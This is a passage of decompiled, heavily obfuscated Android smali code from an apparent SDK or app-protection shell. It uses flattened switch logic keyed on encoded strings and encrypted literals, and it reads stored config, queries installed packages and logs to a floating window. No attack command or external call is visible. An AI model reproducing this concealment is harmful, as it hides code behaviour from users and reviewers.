    const-string v0, "\u06db\u06e6\u06df\u06e7\u06e4\u06d8\u06eb\u06ec\u06dc\u06d9\u06e5\u06df\u06e2\u06e5\u06d8\u06e5\u06d6\u06d6\u06db\u06ec\u06e6\u06e2\u06da\u06d6\u06d8\u06dc\u06d9\u06e2\u06dc\u06eb\u06e6\u06e8\u06e2\u06e6\u06d8\u06df\u06eb\u06dc\u06e5\u06d9\u06ec\u06dc\u06e7"

    goto :goto_2

    :sswitch_5
    const-string v0, "\u06e5\u06ec\u06d7\u06e6\u06e7\u06e4\u06d6\u06dc\u06da\u06ec\u06e8\u06da\u06d8\u06e5\u06e8\u06db\u06dc\u06d7\u06e8\u06e2\u06d7\u06e1\u06dc\u06e5\u06d8\u06dc\u06e2\u06dc\u06df\u06ec\u06d8\u06e0\u06e1\u06e8\u06d8\u06d6\u06d6\u06d6\u06d8\u06ec\u06eb\u06e6\u06d8\u06e6\u06e5"

    goto :goto_2

    :sswitch_6
    const-string v0, "\u06e2\u06d7\u06d6\u06d6\u06d9\u06ec\u06e2\u06d7\u06dc\u06df\u06df\u06e4\u06eb\u06e6\u06df\u06db\u06e1\u06ec\u06e7\u06e0\u06e2\u06df\u06ec\u06eb\u06df\u06e8\u06e0\u06e7\u06df\u06d7\u06d8\u06e2\u06e6\u06dc\u06db\u06e8\u06ec\u06df\u06dc\u06da\u06e4\u06da\u06d6\u06e4"

    goto :goto_1

    :sswitch_7
    const-string v0, "\u06df\u06e1\u06d7\u06e0\u06dc\u06ec\u06d6\u06d7\u06e1\u06d8\u06dc\u06e2\u06d9\u06db\u06da\u06d9\u06df\u06e1\u06e7\u06d8\u06e0\u06e8\u06e1\u06d8\u06da\u06d6\u06e8\u06e6\u06db\u06d8\u06e2\u06dc\u06d8\u06d6\u06d8\u06dc\u06d6\u06ec"

    goto :goto_1

    :sswitch_8
    const-string v0, "\u06d8\u06e8\u06e7\u06da\u06ec\u06e1\u06d8\u06d9\u06df\u06e7\u06dc\u06e2\u06d8\u06d8\u06e0\u06e1\u06e8\u06d8\u06df\u06ec\u06e7\u06d8\u06e0\u06e2\u06da\u06e6\u06ec\u06d8\u06e2\u06e4\u06e7\u06e7\u06e7"

    goto :goto_0

    :sswitch_9
    invoke-static {}, LCu7y/sdk/h5;->getJsonResult()Lorg/json/JSONObject;

    move-result-object v0

    :goto_3
    return-object v0

    :sswitch_a
    sget-object v0, LCu7y/sdk/e5;->b:Lorg/json/JSONObject;

    goto :goto_3

    :sswitch_data_0
    .sparse-switch
        -0xd8cc200 -> :sswitch_a
        0x27a03174 -> :sswitch_0
        0x79a37cc3 -> :sswitch_9
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x67c998af -> :sswitch_1
        -0x2863206c -> :sswitch_8
        0x3ed69227 -> :sswitch_7
        0x4b311b7d -> :sswitch_3
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x3f6b8466 -> :sswitch_6
        0x19c44cd6 -> :sswitch_5
        0x23457a60 -> :sswitch_2
        0x54d4b034 -> :sswitch_4
    .end sparse-switch
.end method

.method public static getisRequesting()Z
    .locals 4

    const-string v0, "\u06e1\u06e1\u06db\u06e0\u06e5\u06e6\u06d8\u06e6\u06d7\u06d8\u06d8\u06e2\u06ec\u06d6\u06dc\u06d6\u06d6\u06d8\u06dc\u06e4\u06e8\u06e0\u06da\u06e5\u06ec\u06e0\u06d6\u06d8\u06e2\u06e4\u06e1\u06d8\u06e1\u06d9\u06e7\u06d6\u06e2\u06d6\u06db\u06e0\u06db"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x8d

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x291

    const/16 v2, 0x3bd

    const v3, -0x14d6640

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    packed-switch v1, :pswitch_data_0

    goto :goto_0

    :pswitch_0
    sget-boolean v0, LCu7y/sdk/e5;->a:Z

    return v0

    nop

    :pswitch_data_0
    .packed-switch -0x76557f03
        :pswitch_0
    .end packed-switch
.end method

.method public static isDebug()Z
    .locals 4

    const-string v0, "\u06d8\u06e4\u06df\u06d8\u06eb\u06e1\u06e7\u06e1\u06e5\u06d8\u06db\u06e5\u06e7\u06da\u06e4\u06db\u06e8\u06da\u06e5\u06d8\u06e0\u06e7\u06e6\u06d8\u06dc\u06ec\u06e8\u06d8\u06e4\u06db\u06d6\u06d8\u06e2\u06da\u06dc\u06e7\u06e7\u06d7\u06e1\u06d6\u06e1\u06d7\u06e4\u06e5\u06df\u06d6\u06e5\u06d8\u06eb\u06db\u06dc\u06d8\u06eb\u06d8\u06e7\u06df\u06da\u06dc\u06d6\u06d8"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x317

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x121

    const/16 v2, 0x92

    const v3, 0x7afeb614

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const v1, 0x47b3dc0

    const-string v0, "\u06ec\u06e7\u06e4\u06ec\u06e1\u06e1\u06d8\u06e2\u06e7\u06e0\u06d8\u06db\u06df\u06df\u06d7\u06dc\u06e6\u06df\u06e6\u06eb\u06d9\u06d7\u06e2\u06e7\u06e1\u06d6\u06e1\u06ec\u06d9\u06db\u06da\u06ec\u06d9\u06eb\u06e8\u06e6\u06e7\u06d6\u06df\u06d7\u06eb\u06e1\u06e1\u06e6\u06d9\u06e1\u06d8\u06d9\u06e2\u06df\u06e8\u06e0\u06da"

    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    xor-int/2addr v2, v1

    sparse-switch v2, :sswitch_data_1

    goto :goto_1

    :sswitch_1
    const-string v0, "\u06e2\u06db\u06d6\u06d8\u06d7\u06d7\u06d8\u06d8\u06e5\u06e5\u06e6\u06d6\u06d6\u06eb\u06d9\u06ec\u06df\u06d9\u06df\u06e6\u06e8\u06e2\u06e2\u06eb\u06db\u06e8\u06db\u06d7\u06da\u06db\u06e4\u06e2\u06e8\u06e5\u06e8\u06d8\u06d9\u06d9\u06e6\u06da\u06e2\u06df\u06d6\u06eb\u06ec\u06e4\u06d6\u06eb\u06dc\u06e5\u06dc\u06e1\u06dc\u06df\u06e5"

    goto :goto_0

    :sswitch_2
    const-string v0, "\u06e1\u06e2\u06e5\u06dc\u06d8\u06db\u06db\u06e5\u06e2\u06e2\u06e4\u06d9\u06e5\u06e1\u06dc\u06d8\u06d8\u06e6\u06ec\u06df\u06e0\u06e2\u06d8\u06d6\u06e7\u06e6\u06e5\u06eb\u06d7\u06e5\u06e1\u06d8"

    goto :goto_1

    :sswitch_3
    const v2, 0x540af15d

    const-string v0, "\u06e2\u06e8\u06e5\u06d8\u06e0\u06e2\u06db\u06e5\u06eb\u06e4\u06da\u06dc\u06e6\u06d8\u06e4\u06da\u06d8\u06d7\u06db\u06d7\u06d6\u06ec\u06e7\u06e0\u06e5\u06e6\u06d7\u06d6\u06d8\u06dc\u06d8\u06e5"

    :goto_2
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2

    goto :goto_2

    :sswitch_4
    const-string v0, "\u06df\u06d6\u06dc\u06e6\u06da\u06d9\u06df\u06e6\u06d8\u06dc\u06df\u06e2\u06e0\u06e7\u06e2\u06d6\u06df\u06e8\u06d8\u06e1\u06e5\u06e8\u06e2\u06e5\u06e7\u06e6\u06e4\u06e1\u06e4\u06e8\u06d6\u06db\u06e4\u06e8\u06ec\u06db\u06e1\u06e6\u06e8\u06df\u06e5\u06d6"

    goto :goto_1

    :cond_0
    const-string v0, "\u06d7\u06e6\u06db\u06e1\u06dc\u06df\u06e7\u06ec\u06e6\u06e4\u06d7\u06e1\u06e2\u06e0\u06d6\u06ec\u06ec\u06e2\u06e0\u06d7\u06e0\u06eb\u06dc\u06e0\u06e5\u06e5\u06d6\u06df\u06df"

    goto :goto_2

    :sswitch_5
    invoke-static {}, Lcom/zyyad/gamf/UgxfpdsWPJtvNIp;->getShellContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lapi/repository/Utils;->isRequest(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "\u06e1\u06e2\u06e6\u06d8\u06eb\u06ec\u06d7\u06d7\u06e1\u06d8\u06eb\u06df\u06df\u06d8\u06e5\u06e5\u06d8\u06e2\u06ec\u06d8\u06d8\u06e0\u06db\u06ec\u06e7\u06db\u06db\u06e6\u06e7\u06e6\u06d8\u06e4\u06d6\u06e7\u06d8\u06e1\u06e2\u06e8\u06df\u06e8\u06d8"

    goto :goto_2

    :sswitch_6
    const-string v0, "\u06da\u06e4\u06dc\u06d8\u06e6\u06db\u06ec\u06ec\u06d6\u06d6\u06e1\u06df\u06e7\u06e7\u06e2\u06dc\u06d8\u06db\u06e0\u06e5\u06e8\u06d8\u06d8\u06e8\u06e0\u06e1\u06e5\u06e7\u06ec\u06e8\u06d8\u06e5\u06e4\u06e8\u06d6\u06e6\u06e5\u06d8\u06ec\u06e7\u06e1\u06e2\u06e1\u06e2\u06d6\u06ec\u06e5\u06d6\u06e7\u06dc\u06df\u06eb\u06dc\u06d8\u06e0\u06dc\u06db"

    goto :goto_2

    :sswitch_7
    const-string v0, "\u06e5\u06e0\u06d8\u06e1\u06e1\u06d6\u06e2\u06e5\u06d8\u06e8\u06e6\u06e5\u06d8\u06e0\u06e7\u06e6\u06d8\u06db\u06db\u06eb\u06e1\u06e4\u06e1\u06d8\u06d8\u06df\u06eb\u06db\u06df\u06e8\u06dc\u06dc\u06e1\u06d8"

    goto :goto_1

    :sswitch_8
    invoke-static {}, LCu7y/sdk/h5;->isDebug()Z

    move-result v0

    :goto_3
    return v0

    :sswitch_9
    sget-boolean v0, LCu7y/sdk/e5;->c:Z

    goto :goto_3

    :sswitch_a
    const-string v0, "\u06e6\u06d6\u06dc\u06d8\u06d6\u06e6\u06e5\u06e7\u06df\u06d8\u06d8\u06e5\u06d8\u06df\u06d9\u06e5\u06e8\u06d8\u06e0\u06d9\u06e0\u06d6\u06e5\u06e1\u06e0\u06e8\u06e8\u06d9\u06d8\u06dc\u06d9\u06e8\u06e6\u06da\u06d9\u06e0\u06d8\u06eb\u06e5\u06d8\u06db\u06e7\u06d6\u06e4\u06e6\u06e1\u06db\u06e8\u06e4\u06d8\u06e5\u06e1"

    goto :goto_0

    :sswitch_data_0
    .sparse-switch
        -0x4517951f -> :sswitch_9
        -0x1915dbbb -> :sswitch_8
        0x78c3141 -> :sswitch_0
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0xe1da94a -> :sswitch_1
        0x13c2f467 -> :sswitch_3
        0x4e9ddb06 -> :sswitch_7
        0x6c859cfd -> :sswitch_a
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x5c0714a4 -> :sswitch_2
        -0x4228c95d -> :sswitch_6
        -0xcdf8142 -> :sswitch_5
        0x616b020d -> :sswitch_4
    .end sparse-switch
.end method

.method public static offline(Landroid/content/Context;)V
    .locals 14

    :try_start_0
    const-string v0, "qmgN83mi\n"

    const-string v1, "yQdjlRDF49w=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lapi/repository/Utils;->shellSP_read(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const v2, -0x26c87d86

    const-string v0, "\u06d9\u06e1\u06e5\u06d8\u06d6\u06dc\u06ec\u06d8\u06da\u06d9\u06da\u06d6\u06d8\u06e8\u06e8\u06eb\u06e0\u06eb\u06df\u06d9\u06df\u06e8\u06d8\u06dc\u06e0\u06e2\u06e1\u06d7\u06df\u06da\u06e1\u06e8"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const v2, -0x3dfc1b69

    const-string v0, "\u06eb\u06e5\u06d7\u06da\u06d6\u06db\u06dc\u06d8\u06d8\u06e8\u06eb\u06e8\u06d8\u06d9\u06e8\u06d8\u06d7\u06df\u06d8\u06d8\u06e1\u06e2\u06da\u06ec\u06d8\u06e7\u06d8\u06e4\u06e1\u06e2\u06d8\u06df\u06e7\u06da\u06e5\u06e6\u06e4\u06e0\u06df\u06d9\u06dc\u06e7\u06d8\u06e4\u06d6\u06dc\u06d8"

    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_1

    goto :goto_1

    :sswitch_1
    const-string v0, "\u06d7\u06e8\u06d6\u06d8\u06dc\u06d6\u06e1\u06d8\u06d9\u06da\u06dc\u06ec\u06d6\u06e8\u06d8\u06dc\u06e4\u06e4\u06dc\u06e2\u06e2\u06e4\u06eb\u06e5\u06d8\u06e5\u06da\u06d7\u06e7\u06e7\u06d6\u06d8\u06d6\u06e8\u06e4\u06db\u06e5\u06dc\u06e1\u06da"

    goto :goto_1

    :sswitch_2
    const-string v0, "\u06e6\u06d9\u06d6\u06dc\u06d8\u06e5\u06d8\u06e4\u06d6\u06d6\u06e4\u06e8\u06eb\u06db\u06dc\u06e0\u06e1\u06e8\u06d7\u06d9\u06e5\u06d8\u06d8\u06eb\u06e1\u06eb\u06e8\u06d8\u06d8\u06d7\u06e4\u06d9\u06e0\u06d8\u06d8\u06ec\u06e5\u06e8\u06d8\u06e0\u06e2\u06dc\u06e4\u06dc\u06e1\u06e6\u06eb\u06dc\u06e2\u06d9\u06dc\u06d8\u06d6\u06ec\u06e2\u06e4\u06e2\u06d6\u06d8"

    goto :goto_0

    :sswitch_3
    const v3, -0x40bdc7a0

    const-string v0, "\u06dc\u06e2\u06e1\u06dc\u06e5\u06e6\u06d8\u06eb\u06e5\u06d7\u06e2\u06d8\u06df\u06df\u06d9\u06e1\u06e8\u06e6\u06da\u06dc\u06e1\u06da\u06da\u06ec\u06d6\u06d6\u06d9\u06e8\u06e2\u06dc\u06db\u06df\u06e7\u06db\u06e8\u06d8\u06e0\u06e2\u06e6\u06d8\u06eb\u06e4\u06d7\u06e1\u06e0\u06da\u06e4\u06db\u06e6\u06d8"

    :goto_2
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_2

    goto :goto_2

    :sswitch_4
    const-string v0, "\u06e6\u06e1\u06dc\u06db\u06e0\u06ec\u06e0\u06e8\u06e7\u06d8\u06df\u06e0\u06eb\u06db\u06e4\u06e0\u06ec\u06da\u06ec\u06ec\u06d8\u06da\u06db\u06e1\u06e5\u06eb\u06d8\u06e5\u06da\u06e0\u06d6\u06da\u06e6\u06dc\u06e0\u06e6\u06e7\u06e1\u06da\u06e8\u06d8\u06e2\u06e6\u06db\u06d8\u06e2\u06e1\u06d7\u06dc\u06e7\u06d8\u06e2\u06db\u06e7\u06df\u06d9\u06e4"

    goto :goto_2

    :cond_0
    const-string v0, "\u06e0\u06ec\u06e5\u06e5\u06e7\u06df\u06e4\u06e1\u06e4\u06d7\u06d8\u06e8\u06d8\u06da\u06dc\u06e8\u06e2\u06e7\u06e1\u06d8\u06dc\u06e6\u06e2\u06dc\u06e1\u06d6\u06d6\u06d9\u06e8\u06df\u06e5\u06d9\u06df\u06e7\u06df\u06da\u06d9\u06d8\u06e0\u06e5\u06df\u06e7\u06dc\u06da\u06d7\u06e6\u06eb\u06d6\u06d6\u06dc\u06db\u06d9\u06e0\u06e0\u06e7\u06df"

    goto :goto_2

    :sswitch_5
    if-eqz v1, :cond_0

    const-string v0, "\u06d6\u06da\u06db\u06e1\u06e2\u06eb\u06d9\u06dc\u06d8\u06dc\u06d6\u06dc\u06e8\u06d8\u06db\u06e7\u06d8\u06d7\u06e1\u06e1\u06e4\u06e5\u06e4\u06db\u06d8\u06e0\u06e6\u06d8\u06eb\u06e7\u06e4"

    goto :goto_2

    :sswitch_6
    const-string v0, "\u06e1\u06dc\u06e1\u06d8\u06d9\u06db\u06e6\u06d8\u06e5\u06ec\u06e6\u06e1\u06e2\u06da\u06e1\u06dc\u06d9\u06da\u06d7\u06e2\u06ec\u06e4\u06eb\u06ec\u06db\u06e5\u06d8\u06d7\u06e5\u06d8\u06d8\u06e7\u06d9\u06e7\u06d9\u06eb\u06d8\u06d8\u06e5\u06e5\u06ec\u06e2\u06d9\u06d6\u06d8\u06d6\u06da\u06d7\u06e0\u06e1\u06e5\u06d8\u06e2\u06db\u06e1\u06d8\u06d9\u06e5\u06d8\u06d8\u06d9\u06e8\u06d8"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    :sswitch_7
    const-string v0, "\u06e4\u06e8\u06e2\u06d7\u06df\u06e5\u06d8\u06d8\u06e4\u06e1\u06d8\u06e7\u06db\u06d7\u06e5\u06e0\u06d9\u06ec\u06dc\u06e7\u06d8\u06eb\u06e2\u06e1\u06e0\u06e1\u06dc\u06d8\u06e7\u06e5\u06e8\u06d8\u06d7\u06ec\u06e1\u06e0\u06e4\u06e6\u06ec\u06da\u06eb\u06eb\u06e6\u06d8\u06dc\u06e0\u06e5\u06db\u06e4\u06d9\u06d9\u06da\u06e7"

    goto :goto_0

    :sswitch_8
    :try_start_1
    const-string v0, "\u06d9\u06d8\u06e8\u06e8\u06d6\u06e8\u06e5\u06e4\u06d8\u06d8\u06d7\u06e7\u06e6\u06e4\u06d8\u06d8\u06e4\u06d7\u06e0\u06db\u06e1\u06d8\u06d8\u06d6\u06d9\u06e6\u06e8\u06e2\u06e5\u06e8\u06d6\u06d6\u06d8\u06df\u06df\u06e8\u06d8\u06e2\u06d6\u06dc\u06d8\u06e7\u06d8\u06da\u06e6\u06e1\u06d8\u06dc\u06d7\u06d8\u06da\u06ec\u06e6\u06dc\u06ec\u06d7\u06eb\u06e0"

    goto :goto_1

    :sswitch_9
    const v3, -0x44c4eed3

    const-string v0, "\u06e1\u06d6\u06dc\u06e6\u06dc\u06ec\u06e0\u06e7\u06dc\u06d8\u06e4\u06da\u06e6\u06e1\u06e5\u06d8\u06ec\u06e2\u06da\u06db\u06da\u06ec\u06dc\u06e0\u06da\u06da\u06e5\u06e7\u06d8\u06e5\u06d7\u06e2\u06dc\u06d8\u06eb\u06e4\u06e8\u06eb\u06da\u06d6\u06e4\u06dc\u06eb\u06d6\u06df\u06d9\u06e4\u06e0\u06e6"

    :goto_3
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_3

    goto :goto_3

    :sswitch_a
    const-string v0, "\u06e6\u06e2\u06e6\u06d8\u06d7\u06eb\u06d9\u06d7\u06e6\u06dc\u06d7\u06d6\u06df\u06db\u06e4\u06e7\u06da\u06da\u06d8\u06d8\u06e1\u06e8\u06e0\u06e7\u06e5\u06d8\u06d8\u06ec\u06e7\u06d9\u06d9\u06e7\u06e8\u06d8\u06e8\u06db\u06e8\u06e5\u06e8\u06e1\u06d8\u06d8\u06e0\u06da\u06e7\u06e8\u06d8\u06dc\u06eb\u06d7\u06da\u06dc\u06dc\u06d8\u06e4\u06e2\u06d8\u06e2\u06e4\u06d6"

    goto :goto_3

    :cond_1
    const-string v0, "\u06d6\u06db\u06e1\u06d9\u06e4\u06e6\u06eb\u06e2\u06e5\u06d8\u06e4\u06da\u06d6\u06d8\u06d6\u06e5\u06df\u06d7\u06da\u06d7\u06e7\u06d7\u06e8\u06d8\u06e5\u06df\u06e5\u06db\u06ec\u06e5\u06d7\u06e1\u06e0\u06d8\u06e5\u06dc\u06d8\u06ec\u06d7\u06d8\u06d8\u06e1\u06dc\u06dc\u06db\u06e5\u06d6\u06ec\u06db\u06df\u06e2\u06d8\u06e7\u06d8\u06d7\u06da\u06e1\u06d8\u06e0\u06d6\u06e5"

    goto :goto_3

    :sswitch_b
    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "\u06e4\u06dc\u06d6\u06d8\u06ec\u06e6\u06d8\u06d8\u06e0\u06e0\u06d9\u06e8\u06e6\u06e1\u06d8\u06e4\u06e1\u06e6\u06d8\u06e6\u06db\u06ec\u06ec\u06e1\u06e5\u06d8\u06d9\u06d8\u06d6\u06d8\u06da\u06d7\u06e0\u06e2\u06e2\u06df\u06da\u06d7\u06da\u06da\u06e5\u06e7\u06e1\u06e4\u06e1\u06eb\u06d6\u06e2\u06df\u06e5\u06d8\u06eb\u06eb\u06eb"

    goto :goto_3

    :sswitch_c
    const-string v0, "\u06e2\u06d8\u06da\u06d9\u06e7\u06e8\u06d8\u06e4\u06e0\u06d8\u06d8\u06e8\u06e6\u06da\u06e1\u06df\u06dc\u06d8\u06eb\u06e0\u06e2\u06e8\u06e8\u06dc\u06d8\u06d8\u06d9\u06eb\u06dc\u06d8\u06e4\u06d7\u06d9\u06d6\u06d8\u06e7\u06db\u06dc\u06ec\u06d9\u06d8\u06e4\u06e5\u06e5\u06d8\u06e4\u06d6\u06e5\u06d8"

    goto :goto_1

    :sswitch_d
    const v2, -0x183f897b

    const-string v0, "\u06da\u06e5\u06ec\u06d6\u06e8\u06d9\u06da\u06da\u06d8\u06eb\u06eb\u06e6\u06e4\u06d9\u06ec\u06e6\u06dc\u06dc\u06e6\u06d6\u06d8\u06e5\u06d6\u06e1\u06e7\u06e5\u06d8\u06d6\u06df\u06e5\u06d8\u06dc\u06e2\u06dc\u06d8\u06d6\u06e8\u06e8\u06d8\u06df\u06df\u06da\u06e2\u06d7"

    :goto_4
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_4

    goto :goto_4

    :sswitch_e
    const-string v0, "\u06da\u06d9\u06df\u06e1\u06e6\u06d7\u06eb\u06df\u06dc\u06e1\u06e0\u06e1\u06d8\u06e0\u06ec\u06e1\u06e5\u06eb\u06da\u06e0\u06e6\u06d8\u06d8\u06e5\u06eb\u06e1\u06e4\u06e5\u06e5\u06d8\u06e0\u06df\u06eb\u06e8\u06dc\u06d8\u06dc\u06d8\u06e5\u06d8\u06e8\u06d8\u06d7\u06d7\u06d6\u06ec"

    goto :goto_4

    :sswitch_f
    const-string v0, "\u06d9\u06e5\u06d8\u06d8\u06d7\u06e1\u06db\u06d9\u06e5\u06e5\u06e0\u06dc\u06e1\u06d8\u06e1\u06e6\u06e5\u06d8\u06e8\u06e6\u06e7\u06d8\u06d6\u06e8\u06dc\u06eb\u06e0\u06d6\u06d8\u06d7\u06e1\u06d8\u06d8\u06eb\u06d9\u06dc\u06d8\u06ec\u06d6\u06e6\u06d9\u06ec\u06e8\u06d8\u06e4\u06e6\u06e6\u06d8\u06df\u06da\u06d8\u06d8\u06e0\u06df\u06dc\u06e5"

    goto :goto_4

    :sswitch_10
    const v3, -0x2806a4be

    const-string v0, "\u06e4\u06d6\u06da\u06e4\u06ec\u06db\u06eb\u06e5\u06e8\u06e5\u06d8\u06e0\u06ec\u06da\u06e5\u06e8\u06e6\u06d8\u06d9\u06e7\u06e2\u06e2\u06d7\u06d9\u06e7\u06d9\u06e4\u06e4\u06e8"

    :goto_5
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_5

    goto :goto_5

    :sswitch_11
    const-string v0, "\u06e1\u06e5\u06eb\u06e0\u06e7\u06df\u06db\u06df\u06d6\u06d8\u06e4\u06e4\u06e6\u06d8\u06e4\u06d8\u06e6\u06d8\u06dc\u06e1\u06e8\u06d7\u06e4\u06d9\u06df\u06d9\u06e1\u06e6\u06da\u06e6\u06d8\u06ec\u06e2\u06e5\u06d8\u06e0\u06d8\u06e7\u06e2\u06d7\u06e7\u06e4\u06eb\u06d8\u06e1\u06dc\u06d8"

    goto :goto_5

    :cond_2
    const-string v0, "\u06db\u06e2\u06e8\u06d8\u06eb\u06e0\u06e6\u06df\u06ec\u06e6\u06db\u06e4\u06df\u06eb\u06da\u06e5\u06d8\u06d6\u06e5\u06e5\u06e7\u06e1\u06e5\u06d8\u06e2\u06e1\u06e1\u06e6\u06da\u06d6\u06d8\u06e0\u06da\u06e0\u06e8\u06e4\u06dc\u06d8\u06da\u06e2\u06dc\u06e1\u06e7\u06e5\u06ec\u06dc\u06d8\u06e0\u06d8\u06d8\u06e7\u06d9\u06d6"

    goto :goto_5

    :sswitch_12
    const-string v0, "9dyTNg==\n"

    const-string v4, "m6n/WiDSksg=\n"

    invoke-static {v0, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    const-string v0, "\u06eb\u06db\u06dc\u06d8\u06e6\u06d7\u06e0\u06d8\u06e5\u06db\u06d8\u06d6\u06e6\u06d8\u06da\u06db\u06e2\u06dc\u06df\u06e5\u06d7\u06e7\u06dc\u06e4\u06eb\u06e8\u06e6\u06e8\u06e6\u06e2\u06da\u06d8\u06d8\u06e6\u06e5\u06e6\u06d8\u06eb\u06da\u06e6\u06d9\u06e1\u06d9\u06e5\u06e8\u06df"

    goto :goto_5

    :sswitch_13
    const-string v0, "\u06e1\u06d8\u06e7\u06d8\u06ec\u06da\u06e8\u06d8\u06e7\u06e2\u06d9\u06e2\u06dc\u06e8\u06d8\u06e5\u06e7\u06e4\u06d9\u06df\u06e0\u06d8\u06e0\u06d9\u06e6\u06dc\u06ec\u06df\u06e1\u06df\u06e8\u06d7\u06db\u06ec\u06e1\u06dc\u06d8\u06e7\u06d9\u06e0\u06e2\u06e2\u06e8\u06df\u06ec\u06e1\u06d6\u06df\u06da\u06ec\u06d9\u06eb"

    goto :goto_4

    :sswitch_14
    const-string v0, "i1xebO9uI4k2J2sYtlBeeUiXBkK1JC98NwdxGqdbUlFdXF9R70kbPG0GB0OzJBFD\n"

    const-string v1, "0Lvi/wrDu9Q=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "o78=\n"

    const-string v2, "zNQknF7BzRc=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    const-string v0, "+28ioHrn\n"

    const-string v1, "mABMxhOA4ik=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lapi/repository/Utils;->shellSP_read(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "dxGaqj0NRVLIS5neTAg6s78Ti6ExJVDokVjDs3hIYLI=\n"

    const-string v2, "LPYmOdig3Q8=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "qL0=\n"

    const-string v3, "x9bmbQyC+sc=\n"

    invoke-static {v2, v3}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "xAUtcbPXCF/MB38n5YVaAQ==\n"

    const-string v2, "9TceRYbhP2c=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/e5;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "dUxoqsFwfyZ0S2iuzw==\n"

    const-string v1, "FyAJyaovD0c=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x0

    const/4 v1, 0x0

    invoke-virtual {v5, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v1

    const-string v0, "o3kT94f68j6mQxTJhv3yOqhDCMGW4g==\n"

    const-string v3, "zRxkqOWWk10=\n"

    invoke-static {v0, v3}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v6

    const v3, -0x2e3016b6

